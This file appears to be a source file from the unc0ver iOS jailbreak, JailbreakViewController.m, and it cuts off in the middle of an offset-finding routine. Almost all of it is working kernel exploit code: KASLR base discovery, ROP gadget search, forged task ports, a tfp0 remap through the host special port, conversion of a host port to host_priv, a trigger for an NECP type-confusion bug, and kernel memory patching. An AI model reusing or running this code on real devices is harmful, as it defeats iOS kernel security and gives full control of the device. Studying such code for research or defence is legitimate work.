//
//  JailbreakViewController.m
//  Undecimus
//
//  Created by pwn20wnd on 8/29/18.
//  Copyright © 2018 - 2019 Pwn20wnd. All rights reserved.
//

#include <sys/snapshot.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <copyfile.h>
#include <spawn.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <libgen.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dirent.h>
#include <sys/sysctl.h>
#include <mach-o/dyld.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/syscall.h>
#include <common.h>
#include <iokit.h>
#include <NSTask.h>
#include <MobileGestalt.h>
#include <netdb.h>
#include <reboot.h>
#import <snappy.h>
#import <inject.h>
#import <patchfinder64.h>
#import "JailbreakViewController.h"
#include "KernelStructureOffsets.h"
#include "empty_list_sploit.h"
#include "KernelMemory.h"
#include "KernelExecution.h"
#include "KernelUtilities.h"
#include "remote_memory.h"
#include "remote_call.h"
#include "unlocknvram.h"
#include "SettingsTableViewController.h"
#include "multi_path_sploit.h"
#include "async_wake.h"
#include "utils.h"
#include "ArchiveFile.h"

@interface NSUserDefaults ()
- (id)objectForKey:(id)arg1 inDomain:(id)arg2;
- (void)setObject:(id)arg1 forKey:(id)arg2 inDomain:(id)arg3;
@end

@interface JailbreakViewController ()

@end

@implementation JailbreakViewController
static JailbreakViewController *sharedController = nil;
static NSMutableString *output = nil;

#define STATUS(msg, btnenbld, tbenbld) do { \
        LOG("STATUS: %@", msg); \
        dispatch_async(dispatch_get_main_queue(), ^{ \
            [UIView performWithoutAnimation:^{ \
                [[[JailbreakViewController sharedController] goButton] setEnabled:btnenbld]; \
                [[[[JailbreakViewController sharedController] tabBarController] tabBar] setUserInteractionEnabled:tbenbld]; \
                [[[JailbreakViewController sharedController] goButton] setTitle:msg forState: btnenbld ? UIControlStateNormal : UIControlStateDisabled]; \
                [[[JailbreakViewController sharedController] goButton] layoutIfNeeded]; \
            }]; \
        }); \
} while (false)

int stage = __COUNTER__;
extern int maxStage;

#define STATUSWITHSTAGE(Stage, MaxStage) STATUS(([NSString stringWithFormat:@"%@ (%d/%d)", NSLocalizedString(@"Exploiting", nil), Stage, MaxStage]), false, false)
#define UPSTAGE() do { \
    __COUNTER__; \
    stage++; \
    STATUSWITHSTAGE(stage, maxStage); \
} while (false)

typedef struct {
    bool load_tweaks;
    bool load_daemons;
    bool dump_apticket;
    bool run_uicache;
    const char *boot_nonce;
    bool disable_auto_updates;
    bool disable_app_revokes;
    bool overwrite_boot_nonce;
    bool export_kernel_task_port;
    bool restore_rootfs;
    bool increase_memory_limit;
    bool install_cydia;
    bool install_openssh;
    bool reload_system_daemons;
} prefs_t;

#define ISADDR(val)            (val != 0 && val != HUGE_VAL && val != -HUGE_VAL)
#define ADDRSTRING(val)        [NSString stringWithFormat:@ADDR, val]

static NSString *bundledResources = nil;

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

#define IMAGE_OFFSET 0x2000
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS 0xfffffff007004000

#define ptrSize sizeof(uintptr_t)

static void writeTestFile(const char *file) {
    _assert(create_file(file, 0, 0644), message, true);
    _assert(clean_file(file), message, true);
}

static vm_address_t get_kernel_base()
{
    uint64_t addr = 0;
    addr = KERNEL_SEARCH_ADDRESS+MAX_KASLR_SLIDE;
    
    while (true) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(tfp0, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACH_HEADER_MAGIC) {
            int ret = vm_read(tfp0, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                LOG("Failed vm_read %i", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(tfp0, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    LOG("Failed vm_read %i", ret);
                    exit(EXIT_FAILURE);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
}

uint64_t
find_gadget_candidate(
                      char** alternatives,
                      size_t gadget_length)
{
    void* haystack_start = (void*)atoi;    // will do...
    size_t haystack_size = 100*1024*1024; // likewise...
    
    for (char* candidate = *alternatives; candidate != NULL; alternatives++) {
        void* found_at = memmem(haystack_start, haystack_size, candidate, gadget_length);
        if (found_at != NULL){
            LOG("found at: %llx", (uint64_t)found_at);
            return (uint64_t)found_at;
        }
    }
    
    return 0;
}

uint64_t blr_x19_addr = 0;
uint64_t
find_blr_x19_gadget()
{
    if (blr_x19_addr != 0){
        return blr_x19_addr;
    }
    char* blr_x19 = "\x60\x02\x3f\xd6";
    char* candidates[] = {blr_x19, NULL};
    blr_x19_addr = find_gadget_candidate(candidates, 4);
    return blr_x19_addr;
}

// thx Siguza
typedef struct {
    uint64_t prev;
    uint64_t next;
    uint64_t start;
    uint64_t end;
} kmap_hdr_t;

uint64_t zm_fix_addr(uint64_t addr) {
    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
    if (zm_hdr.start == 0) {
        // xxx ReadKernel64(0) ?!
        // uint64_t zone_map_ref = find_zone_map_ref();
        LOG("zone_map_ref: %llx ", GETOFFSET(zone_map_ref));
        uint64_t zone_map = ReadKernel64(GETOFFSET(zone_map_ref));
        LOG("zone_map: %llx ", zone_map);
        // hdr is at offset 0x10, mutexes at start
        size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
        LOG("zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
        
        if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
            LOG("kread of zone_map failed!");
            exit(EXIT_FAILURE);
        }
        
        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
            LOG("zone_map is too big, sorry.");
            exit(EXIT_FAILURE);
        }
    }
    
    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
    
    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
}

uint32_t IO_BITS_ACTIVE = 0x80000000;
uint32_t IKOT_TASK = 2;
uint32_t IKOT_NONE = 0;

void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
    // now make the changes to the port object to make it a task port:
    uint64_t port_kaddr = get_address_of_port(getpid(), port);
    
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
    WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
    WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
    
    // swap our receive right for a send right:
    uint64_t task_port_addr = task_self_addr();
    uint64_t task_addr = ReadKernel64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint32_t bits = ReadKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
    
#define IE_BITS_SEND (1<<16)
#define IE_BITS_RECEIVE (1<<17)
    
    bits &= (~IE_BITS_RECEIVE);
    bits |= IE_BITS_SEND;
    
    WriteKernel32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
}

void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
}

uint64_t make_fake_task(uint64_t vm_map) {
    uint64_t fake_task_kaddr = kmem_alloc(0x1000);
    
    void* fake_task = malloc(0x1000);
    memset(fake_task, 0, 0x1000);
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
    kmemcpy(fake_task_kaddr, (uint64_t) fake_task, 0x1000);
    free(fake_task);
    
    return fake_task_kaddr;
}

void set_all_image_info_addr(uint64_t kernel_task_kaddr, uint64_t all_image_info_addr) {
    struct task_dyld_info dyld_info = { 0 };
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
    LOG("Will set all_image_info_addr to: "ADDR"", all_image_info_addr);
    if (dyld_info.all_image_info_addr != all_image_info_addr) {
        LOG("Setting all_image_info_addr...");
        WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_ADDR), all_image_info_addr);
        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
        _assert(dyld_info.all_image_info_addr == all_image_info_addr, message, true);
    } else {
        LOG("All_image_info_addr already set.");
    }
}

void set_all_image_info_size(uint64_t kernel_task_kaddr, uint64_t all_image_info_size) {
    struct task_dyld_info dyld_info = { 0 };
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
    LOG("Will set all_image_info_size to: "ADDR"", all_image_info_size);
    if (dyld_info.all_image_info_size != all_image_info_size) {
        LOG("Setting all_image_info_size...");
        WriteKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ALL_IMAGE_INFO_SIZE), all_image_info_size);
        _assert(task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count) == KERN_SUCCESS, message, true);
        _assert(dyld_info.all_image_info_size == all_image_info_size, message, true);
    } else {
        LOG("All_image_info_size already set.");
    }
}

// Stek29's code.

kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
void remap_tfp0_set_hsp4(mach_port_t *port) {
    // huge thanks to Siguza for hsp4 & v0rtex
    // for explainations and being a good rubber duck :p
    
    // see https://github.com/siguza/hsp4 for some background and explaination
    // tl;dr: there's a pointer comparison in convert_port_to_task_with_exec_token
    //   which makes it return TASK_NULL when kernel_task is passed
    //   "simple" vm_remap is enough to overcome this.
    
    // However, vm_remap has weird issues with submaps -- it either doesn't remap
    // or using remapped addresses leads to panics and kittens crying.
    
    // tasks fall into zalloc, so src_map is going to be zone_map
    // zone_map works perfectly fine as out zone -- you can
    // do remap with src/dst being same and get new address
    
    // however, using kernel_map makes more sense
    // we don't want zalloc to mess with our fake task
    // and neither
    
    // proper way to use vm_* APIs from userland is via mach_vm_*
    // but those accept task ports, so we're gonna set up
    // fake task, which has zone_map as its vm_map
    // then we'll build fake task port from that
    // and finally pass that port both as src and dst
    
    // last step -- wire new kernel task -- always a good idea to wire critical
    // kernel structures like tasks (or vtables :P )
    
    // and we can write our port to realhost.special[4]
    
    uint64_t remapped_task_addr = 0;
    // task is smaller than this but it works so meh
    uint64_t sizeof_task = 0x1000;
    uint64_t kernel_task_kaddr = ReadKernel64(GETOFFSET(kernel_task));
    _assert(kernel_task_kaddr != 0, message, true);
    LOG("kernel_task_kaddr = "ADDR"", kernel_task_kaddr);
    mach_port_t zm_fake_task_port = MACH_PORT_NULL;
    mach_port_t km_fake_task_port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &zm_fake_task_port);
    kr = kr || mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &km_fake_task_port);
    if (kr == KERN_SUCCESS && *port == MACH_PORT_NULL) {
        _assert(mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port) == KERN_SUCCESS, message, true);
    }
    // strref \"Nothing being freed to the zone_map. start = end = %p\\n\"
    // or traditional \"zone_init: kmem_suballoc failed\"
    uint64_t zone_map_kptr = GETOFFSET(zone_map_ref);
    uint64_t zone_map = ReadKernel64(zone_map_kptr);
    // kernel_task->vm_map == kernel_map
    uint64_t kernel_map = ReadKernel64(kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
    uint64_t zm_fake_task_kptr = make_fake_task(zone_map);
    uint64_t km_fake_task_kptr = make_fake_task(kernel_map);
    make_port_fake_task_port(zm_fake_task_port, zm_fake_task_kptr);
    make_port_fake_task_port(km_fake_task_port, km_fake_task_kptr);
    km_fake_task_port = zm_fake_task_port;
    vm_prot_t cur = 0;
    vm_prot_t max = 0;
    _assert(mach_vm_remap(km_fake_task_port, &remapped_task_addr, sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, zm_fake_task_port, kernel_task_kaddr, 0, &cur, &max, VM_INHERIT_NONE) == KERN_SUCCESS, message, true);
    _assert(kernel_task_kaddr != remapped_task_addr, message, true);
    LOG("remapped_task_addr = "ADDR"", remapped_task_addr);
    _assert(mach_vm_wire(mach_host_self(), km_fake_task_port, remapped_task_addr, sizeof_task, VM_PROT_READ | VM_PROT_WRITE) == KERN_SUCCESS, message, true);
    uint64_t port_kaddr = get_address_of_port(getpid(), *port);
    LOG("port_kaddr = "ADDR"", port_kaddr);
    make_port_fake_task_port(*port, remapped_task_addr);
    _assert(ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) == remapped_task_addr, message, true);
    // lck_mtx -- arm: 8  arm64: 16
    uint64_t host_priv_kaddr = get_address_of_port(getpid(), mach_host_self());
    uint64_t realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    WriteKernel64(realhost_kaddr + koffset(KSTRUCT_OFFSET_HOST_SPECIAL) + 4 * sizeof(void*), port_kaddr);
    set_all_image_info_addr(kernel_task_kaddr, kernel_base);
    set_all_image_info_size(kernel_task_kaddr, kernel_slide);
}

void blockDomainWithName(const char *name) {
    NSString *hostsFile = nil;
    NSString *newLine = nil;
    NSString *newHostsFile = nil;
    SETMESSAGE(NSLocalizedString(@"Failed to block domain with name.", nil));
    hostsFile = [NSString stringWithContentsOfFile:@"/etc/hosts" encoding:NSUTF8StringEncoding error:nil];
    newHostsFile = hostsFile;
    newLine = [NSString stringWithFormat:@"\n127.0.0.1 %s\n", name];
    if ([hostsFile rangeOfString:newLine].location == NSNotFound) {
        newHostsFile = [newHostsFile stringByAppendingString:newLine];
    }
    newLine = [NSString stringWithFormat:@"\n::1 %s\n", name];
    if ([hostsFile rangeOfString:newLine].location == NSNotFound) {
        newHostsFile = [newHostsFile stringByAppendingString:newLine];
    }
    if (![newHostsFile isEqual:hostsFile]) {
        [newHostsFile writeToFile:@"/etc/hosts" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

void unblockDomainWithName(const char *name) {
    NSString *hostsFile = nil;
    NSString *newLine = nil;
    NSString *newHostsFile = nil;
    SETMESSAGE(NSLocalizedString(@"Failed to unblock domain with name.", nil));
    hostsFile = [NSString stringWithContentsOfFile:@"/etc/hosts" encoding:NSUTF8StringEncoding error:nil];
    newHostsFile = hostsFile;
    newLine = [NSString stringWithFormat:@"\n127.0.0.1 %s\n", name];
    if ([hostsFile rangeOfString:newLine].location != NSNotFound) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n0.0.0.0 %s\n", name];
    if ([hostsFile rangeOfString:newLine].location != NSNotFound) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n0.0.0.0    %s\n", name];
    if ([hostsFile rangeOfString:newLine].location != NSNotFound) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    newLine = [NSString stringWithFormat:@"\n::1 %s\n", name];
    if ([hostsFile rangeOfString:newLine].location != NSNotFound) {
        newHostsFile = [hostsFile stringByReplacingOccurrencesOfString:newLine withString:@""];
    }
    if (![newHostsFile isEqual:hostsFile]) {
        [newHostsFile writeToFile:@"/etc/hosts" atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

// https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92

int updateVersionString(const char *newVersionString) {
    uintptr_t versionPtr = 0;
    struct utsname u = {0};
    uname(&u);
    
    uintptr_t darwinTextPtr = 0;
    
    char *buf = NULL;
    
    vm_size_t sz;
    uintptr_t TEXT_const = 0;
    uint32_t sizeofTEXT_const = 0;
    uintptr_t DATA_data = 0;
    uint32_t sizeofDATA_data = 0;
    
    char *sectName = "__const";
    
    for (uintptr_t i=kernel_base; i < (kernel_base+0x2000); i+=(ptrSize)) {
        int ret = vm_read(tfp0, i, 0x150, (vm_offset_t*)&buf, (mach_msg_type_number_t*)&sz);
        if (ret != KERN_SUCCESS) {
            LOG("Failed vm_read %i", ret);
            exit(EXIT_FAILURE);
        }
        
        if (!strcmp(buf, sectName) && !strcmp(buf+0x10, "__TEXT")) {
            TEXT_const = *(uintptr_t*)(buf+0x20);
            sizeofTEXT_const = (uint32_t)*(uintptr_t*)(buf+(0x20 + ptrSize));
            
        }
        
        else if (!strcmp(buf, "__data") && !strcmp(buf+0x10, "__DATA")) {
            DATA_data = *(uintptr_t*)(buf+0x20);
            sizeofDATA_data = (uint32_t)*(uintptr_t*)(buf+(0x20 + ptrSize));
        }
        
        if (TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)
            break;
    }
    
    if (!(TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)) {
        LOG("Error parsing kernel macho");
        return -1;
    }
    
    for (uintptr_t i = TEXT_const; i < (TEXT_const+sizeofTEXT_const); i += 2)
    {
        int ret = vm_read_overwrite(tfp0, i, strlen("Darwin Kernel Version"), (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            LOG("Failed vm_read %i", ret);
            return -1;
        }
        if (!memcmp(buf, "Darwin Kernel Version", strlen("Darwin Kernel Version"))) {
            darwinTextPtr = i;
            break;
        }
    }
    
    if (!darwinTextPtr) {
        LOG("Error finding Darwin text");
        return -1;
    }
    
    uintptr_t versionTextXref[ptrSize];
    versionTextXref[0] = darwinTextPtr;
    
    for (uintptr_t i = DATA_data; i < (DATA_data+sizeofDATA_data); i += ptrSize) {
        int ret = vm_read_overwrite(tfp0, i, ptrSize, (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            LOG("Failed vm_read %i", ret);
            return -1;
        }
        
        if (!memcmp(buf, versionTextXref, ptrSize)) {
            versionPtr = i;
            break;
        }
    }
    
    if (!versionPtr) {
        LOG("Error finding _version pointer, did you already patch it?");
        return -1;
    }
    
    kern_return_t ret;
    vm_address_t newStringPtr = 0;
    vm_allocate(tfp0, &newStringPtr, strlen(newVersionString), VM_FLAGS_ANYWHERE);
    
    ret = vm_write(tfp0, newStringPtr, (vm_offset_t)newVersionString, (mach_msg_type_number_t)strlen(newVersionString));
    if (ret != KERN_SUCCESS) {
        LOG("Failed vm_write %i", ret);
        exit(EXIT_FAILURE);
    }
    
    ret = vm_write(tfp0, versionPtr, (vm_offset_t)&newStringPtr, ptrSize);
    if (ret != KERN_SUCCESS) {
        LOG("Failed vm_write %i", ret);
        return -1;
    }
    else {
        memset(&u, 0x0, sizeof(u));
        uname(&u);
        return 0;
    }
}

uint64_t _vfs_context() {
    // vfs_context_t vfs_context_current(void)
    uint64_t vfs_context = kexecute(GETOFFSET(vfs_context_current), 1, 0, 0, 0, 0, 0, 0);
    vfs_context = zm_fix_addr(vfs_context);
    return vfs_context;
}

int _vnode_lookup(const char *path, int flags, uint64_t *vpp, uint64_t vfs_context){
    size_t len = strlen(path) + 1;
    uint64_t vnode = kmem_alloc(sizeof(uint64_t));
    uint64_t ks = kmem_alloc(len);
    kwrite(ks, path, len);
    int ret = (int)kexecute(GETOFFSET(vnode_lookup), ks, 0, vnode, vfs_context, 0, 0, 0);
    if (ret != 0) {
        return -1;
    }
    *vpp = ReadKernel64(vnode);
    kmem_free(ks, len);
    kmem_free(vnode, sizeof(uint64_t));
    return 0;
}

int _vnode_put(uint64_t vnode){
    return (int)kexecute(GETOFFSET(vnode_put), vnode, 0, 0, 0, 0, 0, 0);
}

uint64_t getVnodeAtPath(const char *path) {
    uint64_t vfs_context = 0;
    uint64_t *vpp = NULL;
    uint64_t vnode = 0;
    vfs_context = _vfs_context();
    if (!ISADDR(vfs_context)) {
        LOG("Failed to get vfs_context.");
        goto out;
    }
    vpp = malloc(sizeof(uint64_t));
    if (vpp == NULL) {
        LOG("Failed to allocate memory.");
        goto out;
    }
    if (_vnode_lookup(path, O_RDONLY, vpp, vfs_context) != ERR_SUCCESS) {
        LOG("Failed to get vnode at path \"%s\".", path);
        goto out;
    }
    vnode = *vpp;
out:
    if (vpp != NULL) {
        free(vpp);
        vpp = NULL;
    }
    return vnode;
}

// https://blogs.projectmoon.pw/2018/11/30/A-Late-Kernel-Bug-Type-Confusion-in-NECP/NECPTypeConfusion.c

int necp_die() {
    int necp_fd = syscall(SYS_necp_open, 0);
    if (necp_fd < 0) {
        LOG("Create NECP client failed!");
        return 0;
    }
    LOG("NECP client = %d", necp_fd);
    syscall(SYS_necp_session_action, necp_fd, 1, 0x1234, 0x5678);
    return 0;
}

#define IO_ACTIVE 0x80000000

#define IKOT_HOST 3
#define IKOT_HOST_PRIV 4

void make_host_into_host_priv() {
    uint64_t hostport_addr = get_address_of_port(getpid(), mach_host_self());
    uint32_t old = ReadKernel32(hostport_addr);
    LOG("old host type: 0x%08x", old);
    if ((old & (IO_ACTIVE | IKOT_HOST_PRIV)) != (IO_ACTIVE | IKOT_HOST_PRIV))
        WriteKernel32(hostport_addr, IO_ACTIVE | IKOT_HOST_PRIV);
}

void make_host_priv_into_host() {
    uint64_t hostport_addr = get_address_of_port(getpid(), mach_host_self());
    uint32_t old = ReadKernel32(hostport_addr);
    LOG("old host type: 0x%08x", old);
    if ((old & (IO_ACTIVE | IKOT_HOST)) != (IO_ACTIVE | IKOT_HOST))
        WriteKernel32(hostport_addr, IO_ACTIVE | IKOT_HOST);
}

mach_port_t try_restore_port() {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = host_get_special_port(mach_host_self(), 0, 4, &port);
    if (err == KERN_SUCCESS && port != MACH_PORT_NULL) {
        LOG("got persisted port!");
        // make sure rk64 etc use this port
        return port;
    }
    LOG("unable to retrieve persisted port");
    return MACH_PORT_NULL;
}

double uptime() {
    struct timeval boottime;
    size_t len = sizeof(boottime);
    int mib[2] = { CTL_KERN, KERN_BOOTTIME };
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) < 0) {
        return -1.0;
    }
    time_t bsec = boottime.tv_sec, csec = time(NULL);
    return difftime(csec, bsec);
}

int waitForFile(const char *filename) {
    int rv = 0;
    rv = access(filename, F_OK);
    for (int i = 0; !(i >= 100 || rv == ERR_SUCCESS); i++) {
        usleep(100000);
        rv = access(filename, F_OK);
    }
    return rv;
}

NSString *hexFromInt(NSInteger val) {
    return [NSString stringWithFormat:@"0x%lX", (long)val];
}

void extractResources() {
    NSMutableArray *debsToInstall = [NSMutableArray arrayWithObject:@"resources.deb"];
    NSMutableArray *pkgsToRemove = [NSMutableArray new];
    
    if (debIsInstalled("science.xnu.injector")) {
        [pkgsToRemove addObject:@"science.xnu.injector"];
    }
    if (debIsInstalled("science.xnu.undecimus.resources")) {
        [pkgsToRemove addObject:@"science.xnu.undecimus.resources"];
    }
    if (!debIsConfigured("trustinjector")) {
        [debsToInstall addObject:@"injector.deb"];
    }
    if (!debIsConfigured("mobilesubstrate")) {
        [debsToInstall addObject:@"substrate-safemode.deb"];
        [debsToInstall addObject:@"mobilesubstrate.deb"];
    }
    if ([pkgsToRemove count] > 0)
        _assert(removePkgs(pkgsToRemove, true), message, true);
    
    _assert(installDebs(debsToInstall, true), message, true);
}

bool load_prefs(prefs_t *prefs, NSDictionary *defaults) {
    if (prefs == NULL) {
        return false;
    }
    prefs->load_tweaks = [defaults[K_TWEAK_INJECTION] boolValue];
    prefs->load_daemons = [defaults[K_LOAD_DAEMONS] boolValue];
    prefs->dump_apticket = [defaults[K_DUMP_APTICKET] boolValue];
    prefs->run_uicache = [defaults[K_REFRESH_ICON_CACHE] boolValue];
    prefs->boot_nonce = [defaults[K_BOOT_NONCE] UTF8String];
    prefs->disable_auto_updates = [defaults[K_DISABLE_AUTO_UPDATES] boolValue];
    prefs->disable_app_revokes = [defaults[K_DISABLE_APP_REVOKES] boolValue];
    prefs->overwrite_boot_nonce = [defaults[K_OVERWRITE_BOOT_NONCE] boolValue];
    prefs->export_kernel_task_port = [defaults[K_EXPORT_KERNEL_TASK_PORT] boolValue];
    prefs->restore_rootfs = [defaults[K_RESTORE_ROOTFS] boolValue];
    prefs->increase_memory_limit = [defaults[K_INCREASE_MEMORY_LIMIT] boolValue];
    prefs->install_cydia = [defaults[K_INSTALL_CYDIA] boolValue];
    prefs->install_openssh = [defaults[K_INSTALL_OPENSSH] boolValue];
    prefs->reload_system_daemons = [defaults[K_RELOAD_SYSTEM_DAEMONS] boolValue];
    return true;
}

void exploit()
{
    int rv = 0;
    pid_t myPid = getpid();
    uint64_t myProcAddr = 0;
    uint64_t myOriginalCredAddr = 0;
    uint64_t myCredAddr = 0;
    uint64_t kernelCredAddr = 0;
    uint64_t Shenanigans = 0;
    prefs_t prefs;
    bool needResources = false;
    bool needStrap = false;
    bool needSubstrate = false;
    bool updatedResources = false;
    NSUserDefaults *userDefaults = nil;
    NSDictionary *userDefaultsDictionary = nil;
    NSString *prefsFile = nil;
    NSString *homeDirectory = NSHomeDirectory();

    UPSTAGE();
    
    {
        // Load preferences.
        LOG("Loading preferences...");
        SETMESSAGE(NSLocalizedString(@"Failed to load preferences.", nil));
        NSString *user = @"mobile";
        userDefaults = [[NSUserDefaults alloc] initWithUser:user];
        userDefaultsDictionary = [userDefaults dictionaryRepresentation];
        NSBundle *bundle = [NSBundle mainBundle];
        NSDictionary *infoDictionary = [bundle infoDictionary];
        NSString *bundleIdentifierKey = @"CFBundleIdentifier";
        NSString *bundleIdentifier = [infoDictionary objectForKey:bundleIdentifierKey];
        prefsFile = [NSString stringWithFormat:@"%@/Library/Preferences/%@.plist", homeDirectory, bundleIdentifier];
        bzero(&prefs, sizeof(prefs));
        _assert(load_prefs(&prefs, userDefaultsDictionary), message, true);
        LOG("Successfully loaded preferences.");
    }
    
    UPSTAGE();
    
    {
        // Initialize patchfinder64.
        
        LOG("Initializing patchfinder64...");
        SETMESSAGE(NSLocalizedString(@"Failed to initialize patchfinder64.", nil));
        _assert(init_kernel(kernel_base, NULL) == ERR_SUCCESS, message, true);
        LOG("Successfully initialized patchfinder64.");
    }
    
    UPSTAGE();
    
    {
        // Find offsets.
        
        LOG("Finding offsets...");
        SETMESSAGE(NSLocalizedString(@"Failed to find trust_chain offset.", nil));
        SETOFFSET(trust_chain, find_trustcache());
        LOG("trust_chain = "ADDR"", GETOFFSET(trust_chain));
        _assert(ISADDR(GETOFFSET(trust_chain)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find OSBoolean_True offset.", nil));
        SETOFFSET(OSBoolean_True, find_OSBoolean_True());
        LOG("OSBoolean_True = "ADDR"", GETOFFSET(OSBoolean_True));
        _assert(ISADDR(GETOFFSET(OSBoolean_True)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find osunserializexml offset.", nil));
        SETOFFSET(osunserializexml, find_osunserializexml());
        LOG("osunserializexml = "ADDR"", GETOFFSET(osunserializexml));
        _assert(ISADDR(GETOFFSET(osunserializexml)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find smalloc offset.", nil));
        SETOFFSET(smalloc, find_smalloc());
        LOG("smalloc = "ADDR"", GETOFFSET(smalloc));
        _assert(ISADDR(GETOFFSET(smalloc)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find add_x0_x0_0x40_ret offset.", nil));
        SETOFFSET(add_x0_x0_0x40_ret, find_add_x0_x0_0x40_ret());
        LOG("add_x0_x0_0x40_ret = "ADDR"", GETOFFSET(add_x0_x0_0x40_ret));
        _assert(ISADDR(GETOFFSET(add_x0_x0_0x40_ret)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find zone_map_ref offset.", nil));
        SETOFFSET(zone_map_ref, find_zone_map_ref());
